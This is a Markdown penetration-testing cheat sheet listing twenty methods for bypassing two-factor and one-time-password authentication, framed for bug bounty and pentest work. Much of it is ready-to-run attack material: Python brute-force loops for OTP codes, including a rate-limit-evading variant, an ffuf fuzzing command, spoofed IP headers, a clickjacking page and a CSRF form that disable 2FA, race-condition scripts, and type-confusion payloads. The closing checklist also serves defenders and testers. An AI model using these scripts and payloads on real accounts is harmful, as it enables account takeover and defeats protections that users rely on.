# 🔓 2FA / MFA / OTP Bypass

> A complete reference for bypassing Two-Factor Authentication (2FA), Multi-Factor Authentication (MFA), and One-Time Password (OTP) implementations during penetration testing and bug bounty engagements.

---

## Table of Contents

- [Overview](#overview)
- [2FA Types & Attack Surface](#2fa-types--attack-surface)
- [Method 1 — Direct Bypass (Skip 2FA Step)](#method-1--direct-bypass-skip-2fa-step)
- [Method 2 — Response Manipulation](#method-2--response-manipulation)
- [Method 3 — Status Code Manipulation](#method-3--status-code-manipulation)
- [Method 4 — Brute Force OTP](#method-4--brute-force-otp)
- [Method 5 — Rate Limit Bypass](#method-5--rate-limit-bypass)
- [Method 6 — OTP Reuse (No Expiry)](#method-6--otp-reuse-no-expiry)
- [Method 7 — OTP Leakage](#method-7--otp-leakage)
- [Method 8 — Predictable OTP](#method-8--predictable-otp)
- [Method 9 — OTP Parameter Manipulation](#method-9--otp-parameter-manipulation)
- [Method 10 — Backup Code Abuse](#method-10--backup-code-abuse)
- [Method 11 — Password Reset Disables 2FA](#method-11--password-reset-disables-2fa)
- [Method 12 — OAuth & SSO Bypass](#method-12--oauth--sso-bypass)
- [Method 13 — SIM Swapping & SS7 Attack](#method-13--sim-swapping--ss7-attack)
- [Method 14 — Clickjacking on 2FA Disable](#method-14--clickjacking-on-2fa-disable)
- [Method 15 — CSRF on 2FA Actions](#method-15--csrf-on-2fa-actions)
- [Method 16 — Race Condition](#method-16--race-condition)
- [Method 17 — Old API Version Bypass](#method-17--old-api-version-bypass)
- [Method 18 — Subdomain / Testing Environment](#method-18--subdomain--testing-environment)
- [Method 19 — Cookie / Token Reuse After 2FA](#method-19--cookie--token-reuse-after-2fa)
- [Method 20 — Referrer / Header-Based Bypass](#method-20--referrer--header-based-bypass)
- [Complete Testing Checklist](#complete-testing-checklist)
- [Tools](#tools)
- [References](#references)

---

## Overview

**2FA** adds a second layer of authentication beyond username/password. Despite its intent to improve security, poor implementation creates numerous bypass opportunities.

### How 2FA Normally Works

```
[1] User enters username + password
       ↓
[2] Server validates credentials
       ↓
[3] Server sends OTP (SMS / Email / TOTP App)
       ↓
[4] User enters OTP
       ↓
[5] Server validates OTP → grants access token/session
```

### Where Bypasses Occur

```
[1] Credentials ──────── No bypass here (normal auth)
[2] Validation ────────── Response/status manipulation
[3] OTP delivery ──────── Leakage, interception
[4] OTP input ─────────── Brute force, reuse, prediction
[5] Token grant ───────── Direct step skip, race condition
```

---

## 2FA Types & Attack Surface

| 2FA Type | Delivery | Primary Attacks |
|---|---|---|
| **SMS OTP** | Text message | SIM swap, SS7, brute force, rate limit bypass |
| **Email OTP** | Email | Token leakage in response, brute force, no expiry |
| **TOTP** | Authenticator app (Google Auth, Authy) | Old code reuse, predictable seed, brute force |
| **Push Notification** | Mobile app | Notification fatigue (MFA bombing) |
| **Hardware Token** | Physical device | Predictable counter, cloning |
| **Backup Codes** | Pre-generated list | Brute force, unlimited use |
| **Magic Link** | Email link | Token leakage, no expiry |

---

## Method 1 — Direct Bypass (Skip 2FA Step)

> After a successful username/password login, the server places the user in a **"pre-2FA authenticated"** state. If the 2FA check is not enforced server-side, you can skip directly to authenticated endpoints.

### Steps

```
1. Login with valid credentials → land on /2fa or /verify-otp page
2. Manually navigate directly to authenticated pages:
   → /dashboard
   → /account/settings
   → /admin
   → /home
3. If access is granted → 2FA is client-enforced only (BYPASS)
```

### With Burp Suite

```
1. Login → intercept the POST /login response
2. Follow redirect to /2fa page
3. In Burp browser — change URL directly to /dashboard
4. If dashboard loads → BYPASS confirmed
```

### cURL Test

```bash
# Step 1: Login and capture session cookie
curl -c cookies.txt -X POST https://target.com/login \
  -d "username=victim&password=password123"

# Step 2: Skip 2FA — go directly to dashboard
curl -b cookies.txt https://target.com/dashboard
# If 200 OK → bypass successful
```

---

## Method 2 — Response Manipulation

> The server returns a JSON response after the 2FA step. If the client uses this response to decide whether to grant access, you can manipulate it to simulate a successful verification.

### Intercept & Modify Response

```
# Original server response (failed 2FA):
HTTP/1.1 200 OK
{"success": false, "message": "Invalid OTP"}

# Modified response (Burp Intercept → Response):
HTTP/1.1 200 OK
{"success": true, "message": "OTP Verified"}
```

### Common Response Fields to Flip

```json
// Change false → true
{"success": false}       →  {"success": true}
{"verified": false}      →  {"verified": true}
{"valid": false}         →  {"valid": true}
{"status": "fail"}       →  {"status": "success"}
{"code": 400}            →  {"code": 200}
{"mfa_required": true}   →  {"mfa_required": false}
{"otp_valid": 0}         →  {"otp_valid": 1}
```

### Burp Suite Steps

```
1. Proxy → Intercept ON
2. Submit wrong OTP
3. Forward request → intercept the RESPONSE
4. Modify success field from false to true
5. Forward → observe if application grants access
```

---

## Method 3 — Status Code Manipulation

> Similar to response manipulation but focused on HTTP status codes.

```
# Server returns 403 on wrong OTP
HTTP/1.1 403 Forbidden

# Manipulate to:
HTTP/1.1 200 OK

# Or server returns 401 on wrong OTP
HTTP/1.1 401 Unauthorized

# Change to:
HTTP/1.1 200 OK
```

### Also Test

```
# Change redirect location in response header
Location: /2fa-failed  →  Location: /dashboard

# Remove 2FA redirect entirely
# If server sends 302 → /verify-otp, remove the redirect
# Browser may proceed directly to original destination
```

---

## Method 4 — Brute Force OTP

> 4-digit OTP = 10,000 combinations. 6-digit OTP = 1,000,000 combinations. With no rate limiting or lockout — both are brute-forceable.

### Burp Suite Intruder

```
POST /verify-otp HTTP/1.1
Host: target.com
Content-Type: application/json

{"otp": "§000000§"}

# Payload: Numbers 000000 → 999999
# Attack type: Sniper
# Filter: Look for different response length or status 200
```

### ffuf Brute Force

```bash
# Generate OTP wordlist
seq -w 0 999999 > otp_list.txt

# Fuzz
ffuf -u https://target.com/verify-otp \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"otp":"FUZZ","session":"SESSION_TOKEN"}' \
  -w otp_list.txt \
  -mc 200 \
  -fs NORMAL_RESPONSE_SIZE
```

### Python Script

```python
import requests

session_cookie = "your_session_cookie_here"
url = "https://target.com/verify-otp"

for otp in range(1000000):
    code = str(otp).zfill(6)
    r = requests.post(url,
        json={"otp": code},
        cookies={"session": session_cookie})
    if "success" in r.text or r.status_code == 200:
        print(f"[+] Valid OTP found: {code}")
        break
    print(f"[-] Tried: {code}", end="\r")
```

### Meet-in-the-Middle (When Rate Limit Exists)

```
Scenario: Rate limit kicks in after N attempts
Attack:
  Thread 1 → Keep requesting new OTPs from server
  Thread 2 → Brute force OTP values

At some point: the requested OTP = the brute-forced value
→ Login succeeds mid-stream
```

---

## Method 5 — Rate Limit Bypass

> Rate limiting often exists but can be circumvented.

### IP Rotation Headers

```
# Add/rotate these headers to bypass IP-based rate limits
X-Forwarded-For: 1.2.3.4
X-Forwarded-For: 10.0.0.1
X-Real-IP: 5.6.7.8
X-Originating-IP: 192.168.1.1
X-Remote-IP: 172.16.0.1
X-Client-IP: 203.0.113.1
True-Client-IP: 198.51.100.1
CF-Connecting-IP: 104.18.0.1
```

### Burp Macro — Auto-increment Header

```
# In Burp Intruder → Add X-Forwarded-For header
# Use payload type: Numbers (1.1.1.1 → 1.1.1.255)
# Each request gets a different IP
```

### Resend to Reset Rate Limit

```
# Some apps reset rate limit when a new OTP is requested
1. Hit rate limit (e.g., after 5 attempts)
2. Request a new OTP
3. Rate limit counter resets
4. Try 5 more times
5. Repeat → effectively unlimited attempts
```

### Null Byte / Encoding Bypass

```
# Add null byte or special chars to OTP field
{"otp": "123456\u0000"}
{"otp": "%00123456"}
{"otp": " 123456"}      ← leading space
{"otp": "123456 "}      ← trailing space
```

### Different Endpoint Same Validation

```
# Rate limit on /v1/verify-otp but not on /v2/verify-otp
# Rate limit on /api/2fa but not on /api/mfa
# Rate limit on POST but not on PUT/PATCH
```

### Slow Brute Force

```
# Rate limit: 5 attempts / minute
# Try 4 attempts, wait 60 seconds, try 4 more
# With long OTP expiry (10 min) → can try 40 codes before expiry
# Automated with delays:
```

```python
import requests, time

for otp in range(1000000):
    code = str(otp).zfill(6)
    r = requests.post(url, json={"otp": code}, ...)
    if r.status_code != 429:
        if "success" in r.text:
            print(f"[+] {code}")
            break
    else:
        time.sleep(60)  # Wait before continuing
```

---

## Method 6 — OTP Reuse (No Expiry)

> OTPs should expire after one use and after a time window. If not invalidated, they can be replayed.

### Test Steps

```
1. Request an OTP → receive code e.g. 482910
2. Use the OTP to login → access granted
3. LOGOUT
4. Login again → land on 2FA page
5. Submit the SAME OTP: 482910
6. If access granted → OTP not invalidated after use (BYPASS)
```

### Expired OTP Reuse

```
1. Request an OTP → wait 30+ minutes (past expiry)
2. Submit the expired OTP
3. If accepted → no expiry enforced (BYPASS)
```

### Old TOTP Window Abuse

```
# TOTP codes rotate every 30 seconds
# Some servers accept codes from the previous window (30–90s old)
# Test submitting a 2–5 minute old TOTP code
```

---

## Method 7 — OTP Leakage

> The OTP may be exposed in the HTTP response, JS source, cookies, or headers.

### Check Response Body

```
# After requesting an OTP, inspect the server response carefully
POST /send-otp
→ Response:
{
  "message": "OTP sent",
  "otp": "482910",          ← LEAKED in response
  "debug": true
}
```

### Check JS Source Files

```bash
# Search for OTP generation logic or hardcoded values in JS
grep -r "otp\|token\|secret\|code" /path/to/js/files
```

### Check Cookies

```
# After OTP is sent, inspect Set-Cookie headers
Set-Cookie: otp=482910; Path=/     ← LEAKED in cookie
Set-Cookie: verification_code=482910
```

### Check HTTP Headers

```
# Some APIs leak tokens in response headers
X-OTP-Token: 482910
X-Verification-Code: 482910
```

### Android App — Client-Side OTP Generation

```bash
# Decompile APK and look for OTP generation logic
apktool d app.apk
grep -r "otp\|generateCode\|totp" smali/

# If OTP is generated client-side using a seed visible in the app
# → Regenerate the same OTP server expects
```

---

## Method 8 — Predictable OTP

> If OTP generation is not cryptographically random, it may be predictable.

### Sequential OTPs

```
# Request 3 OTPs in sequence and observe:
OTP 1: 482910
OTP 2: 482911
OTP 3: 482912
→ Sequential → predict next = 482913
```

### Timestamp-Based OTPs

```python
import time, hashlib

# If OTP = MD5(timestamp) or similar
ts = int(time.time())
predicted_otp = hashlib.md5(str(ts).encode()).hexdigest()[:6]
print(f"Predicted OTP: {predicted_otp}")
```

### User-Data-Based OTPs

```
# OTP derived from known user data
OTP = last 6 digits of phone number
OTP = birth year + last 4 of account ID
OTP = MD5(username) truncated to 6 digits
```

---

## Method 9 — OTP Parameter Manipulation

> Manipulating the OTP value, type, or structure in the request.

### Remove OTP Parameter

```json
// Original request
{"username": "admin", "password": "pass", "otp": "482910"}

// Remove otp field entirely
{"username": "admin", "password": "pass"}
```

### Empty / Null OTP

```json
{"otp": ""}
{"otp": null}
{"otp": "null"}
{"otp": "undefined"}
{"otp": false}
{"otp": 0}
{"otp": "000000"}
```

### Boolean / Type Confusion

```json
{"otp": true}          ← Type confusion — true = valid?
{"otp": []}            ← Empty array
{"otp": {}}            ← Empty object
{"otp": ["482910"]}    ← Array wrapping
```

### Array Bypass (PHP / Node.js)

```
# PHP: otp[]=anything may bypass strict comparison
otp[]=482910

# Burp — change:
otp=WRONG
# to:
otp[]=WRONG
```

### Wildcard / Regex

```json
{"otp": ".*"}
{"otp": "%"}
{"otp": "_"}
```

---

## Method 10 — Backup Code Abuse

> Backup codes are fallback codes for when primary 2FA is unavailable. Misconfiguration can make them exploitable.

### Brute Force Backup Codes

```
# Backup codes are typically 8-10 alphanumeric characters
# Example space: 36^8 = ~2.8 trillion (not feasible without no rate limit)
# But many apps use simpler formats:
# 6 numeric digits = 1,000,000 (feasible)
# 8 numeric digits = 100,000,000 (borderline)
```

### Unlimited Use Backup Codes

```
1. Get a backup code
2. Use it to login → access granted
3. Logout, login again
4. Use the SAME backup code
5. If accepted → codes not invalidated after use
```

### Reset 2FA via Backup Code

```
# Some apps allow full 2FA removal using backup codes
# After disabling 2FA via backup code → account has no 2FA
# Attacker with access to backup code can permanently remove 2FA
```

---

## Method 11 — Password Reset Disables 2FA

> Some applications automatically disable 2FA when a password reset is performed.

### Test Steps

```
1. Target: account with 2FA enabled
2. Trigger password reset for the target account
3. Complete the password reset flow
4. Attempt to login with new password
5. If 2FA is NOT prompted → 2FA was disabled by password reset (BYPASS)
```

### Email Change Disables 2FA

```
1. Change the account email address
2. Logout and login
3. Check if 2FA is still enforced
4. Some apps reset 2FA on email change → BYPASS
```

---

## Method 12 — OAuth & SSO Bypass

> When OAuth/SSO is used for login, 2FA may only apply to the direct login flow, not the OAuth flow.

### Test Steps

```
1. Application has both direct login and OAuth (Google, GitHub, etc.)
2. Direct login → 2FA required
3. Login via OAuth → 2FA NOT required (BYPASS)

# Even if the same account is linked to both
# OAuth flow may skip the 2FA gate entirely
```

### Token Endpoint Direct Access

```
# If OAuth issues a token after identity provider auth
# Try accessing the token endpoint directly
POST /oauth/token
{
  "grant_type": "password",
  "username": "victim",
  "password": "password123",
  "client_id": "app_client"
}
# If token returned without 2FA → BYPASS
```

---

## Method 13 — SIM Swapping & SS7 Attack

> Attacks on the telecom layer to intercept SMS OTPs.

### SIM Swap

```
1. Attacker contacts victim's mobile carrier
2. Social engineers a SIM transfer to attacker-controlled SIM
3. Victim's phone number now routes to attacker's device
4. SMS OTPs for the victim are delivered to attacker
5. Attacker completes 2FA with intercepted OTP
```

### SS7 Attack

```
# SS7 (Signaling System 7) protocol vulnerabilities
# Allow interception of SMS and calls at the network level
# Tools: SigPloit, ss7MAPer (research/telecom lab use)
# Attacker with SS7 access can:
#   - Intercept SMS OTPs in transit
#   - Redirect calls
#   - Track location
```

> **Note:** SS7 attacks require telecom network access. SIM swapping requires social engineering the carrier.

---

## Method 14 — Clickjacking on 2FA Disable

> If the "disable 2FA" page lacks X-Frame-Options, it can be embedded in an iframe to trick users into disabling their own 2FA.

### Proof of Concept

```html
<!DOCTYPE html>
<html>
<head>
  <style>
    iframe {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      opacity: 0.0;  /* Invisible iframe over decoy content */
      z-index: 2;
    }
    .decoy {
      position: absolute;
      top: 50px; left: 50px;
      z-index: 1;
    }
  </style>
</head>
<body>
  <div class="decoy">
    <h2>Click here to claim your prize!</h2>
    <button style="margin-top: 150px;">CLICK ME</button>
  </div>
  <iframe src="https://target.com/account/disable-2fa"></iframe>
</body>
</html>
```

### Check Header

```bash
curl -I https://target.com/account/disable-2fa | grep -i "x-frame-options\|content-security-policy"
# Missing X-Frame-Options → vulnerable to clickjacking
```

---

## Method 15 — CSRF on 2FA Actions

> If 2FA enable/disable actions lack CSRF protection, an attacker can forge requests.

### Disable 2FA via CSRF

```html
<!-- Attacker page -->
<form id="csrf" action="https://target.com/account/disable-2fa" method="POST">
  <input name="confirm" value="yes">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### Test for CSRF Token

```
1. Navigate to 2FA settings → enable/disable 2FA
2. Intercept the request in Burp
3. Check for CSRF token in body or headers
4. Remove the CSRF token → resend
5. If request succeeds → CSRF vulnerability
```

---

## Method 16 — Race Condition

> Submit multiple concurrent OTP validation requests to exploit TOCTOU (Time of Check to Time of Use) race conditions.

### Burp Suite Turbo Intruder

```python
# Turbo Intruder script — race condition on OTP
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=1,
                           pipeline=False)

    for i in range(20):
        engine.queue(target.req, '482910')  # Same OTP, 20x concurrent

def handleResponse(req, interesting):
    if '200' in req.response or 'success' in req.response:
        table.add(req)
```

### Python Concurrent Requests

```python
import requests
import threading

def send_otp(session_cookie, otp):
    r = requests.post("https://target.com/verify-otp",
        json={"otp": otp},
        cookies={"session": session_cookie})
    print(f"[{otp}] → {r.status_code} {r.text[:50]}")

threads = []
for _ in range(20):
    t = threading.Thread(target=send_otp, args=("COOKIE", "482910"))
    threads.append(t)

for t in threads:
    t.start()
for t in threads:
    t.join()
```

---

## Method 17 — Old API Version Bypass

> Older API versions may lack 2FA enforcement entirely.

### Test Different API Versions

```bash
# If app uses /api/v2/ — try older versions
curl https://target.com/api/v1/login -d "username=admin&password=pass"
curl https://target.com/api/v3/login -d "username=admin&password=pass"
curl https://target.com/api/login   -d "username=admin&password=pass"

# Mobile API endpoints
curl https://mobile.target.com/api/login
curl https://api.target.com/mobile/v1/login

# Check if 2FA is enforced on all versions
```

---

## Method 18 — Subdomain / Testing Environment

> Dev, staging, or testing subdomains may run older code without 2FA.

### Subdomain Enumeration

```bash
subfinder -d target.com | grep -i "dev\|stage\|test\|qa\|uat\|beta\|old\|v1\|v2"

# Common testing subdomains
dev.target.com
staging.target.com
test.target.com
beta.target.com
uat.target.com
qa.target.com
```

### Test Login on Each

```bash
for sub in dev staging test beta uat qa; do
  echo -n "[$sub] → "
  curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://$sub.target.com/login \
    -d "username=testuser&password=testpass"
  echo ""
done
```

---

## Method 19 — Cookie / Token Reuse After 2FA

> After completing 2FA once, the session token might bypass 2FA requirements on reuse.

### Test Steps

```
1. Complete full login flow including 2FA → get session token
2. Store the session token
3. Logout
4. Use the OLD session token directly (without going through login or 2FA)
5. If session still valid → session not invalidated on logout
```

### Pre-2FA Session Token

```
1. Login with credentials → receive pre-2FA session token (before OTP step)
2. Note this token
3. Complete 2FA normally
4. Reuse the PRE-2FA token in another browser/session
5. If that token grants full access → 2FA state not tied to token
```

---

## Method 20 — Referrer / Header-Based Bypass

> Some applications check headers like Referer or X-Forwarded-For to decide whether to enforce 2FA.

### Referrer Header Manipulation

```
# Add a trusted Referer header
Referer: https://target.com/dashboard
Referer: https://trusted-internal.target.com/

# Some apps skip 2FA for requests originating from trusted internal pages
```

### Internal IP Spoofing

```
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 10.0.0.1
X-Real-IP: 192.168.1.1

# If app trusts requests from "internal" IPs and skips 2FA
```

### Admin User-Agent

```
User-Agent: InternalBot/1.0
User-Agent: MonitoringService/2.0
```

---

## Complete Testing Checklist

### Flow & Logic
- [ ] Can 2FA step be skipped by navigating directly to authenticated pages?
- [ ] Can the 2FA page be accessed and submitted for another user's session?
- [ ] Does password reset disable 2FA?
- [ ] Does email change disable 2FA?
- [ ] Does OAuth/SSO login bypass 2FA?

### Response & Status Manipulation
- [ ] Server response manipulation (false → true) grants access?
- [ ] HTTP status code manipulation (403 → 200) grants access?
- [ ] Redirect header manipulation (/2fa-fail → /dashboard) grants access?

### OTP Weaknesses
- [ ] OTP brute-forceable (4 or 6 digit)?
- [ ] OTP valid after use (no invalidation)?
- [ ] OTP valid after expiry window?
- [ ] OTP leaked in response body, cookie, or header?
- [ ] OTP is sequential or predictable?
- [ ] OTP generated client-side (in JS or mobile app)?
- [ ] Old TOTP window (30–90 seconds old) accepted?

### Rate Limiting
- [ ] No rate limiting on OTP submission?
- [ ] Rate limit bypassable via IP rotation headers?
- [ ] Rate limit resets when new OTP is requested?
- [ ] Rate limit only on main endpoint, not alternate endpoints?
- [ ] Slow brute force viable (low attempts per interval)?
- [ ] Rate limit check bypassed via null byte or encoding?

### Parameter Manipulation
- [ ] Removing OTP parameter bypasses check?
- [ ] Empty string OTP accepted?
- [ ] Null / null / true / false / 0 accepted?
- [ ] Array wrapping (otp[]=value) bypasses validation?
- [ ] Type confusion bypasses strict comparison?

### Backup & Recovery
- [ ] Backup codes brute-forceable?
- [ ] Backup codes reusable after first use?
- [ ] Backup codes displayed in cleartext in response?
- [ ] Backup code usage disables 2FA permanently?

### Infrastructure & Logic
- [ ] Old API versions lack 2FA enforcement?
- [ ] Testing/staging subdomains lack 2FA?
- [ ] Race condition on concurrent OTP submissions?
- [ ] CSRF on 2FA enable/disable actions?
- [ ] Clickjacking on 2FA disable page?
- [ ] Session token reuse from before 2FA is completed?
- [ ] Pre-2FA session grants full access?
- [ ] Header-based bypass (Referer, X-Forwarded-For)?

---

## Tools

| Tool | Purpose |
|---|---|
| **Burp Suite** | Intercept, response manipulation, Intruder brute force |
| **Turbo Intruder** | High-speed race condition testing |
| **ffuf** | OTP brute force via HTTP fuzzing |
| **Hydra** | OTP/login brute force |
| **Python requests** | Custom race condition and brute force scripts |
| **Frida** | Mobile app OTP extraction / hooking |
| **apktool** | APK decompilation to find OTP generation logic |
| **mitmproxy** | Intercept mobile 2FA traffic |

---

## References

- HackTricks — 2FA/MFA/OTP Bypass
- PortSwigger Web Security Academy — Multi-Factor Authentication
- OWASP Testing Guide — OTP Testing
- Cobalt — MFA Bypass Techniques
- PayloadsAllTheThings — 2FA Bypass
- Bug Bounty Reports:
  - HackerOne — Response manipulation 2FA bypass
  - HackerOne — Rate limit reset via OTP resend
  - HackerOne — Pre-2FA session reuse
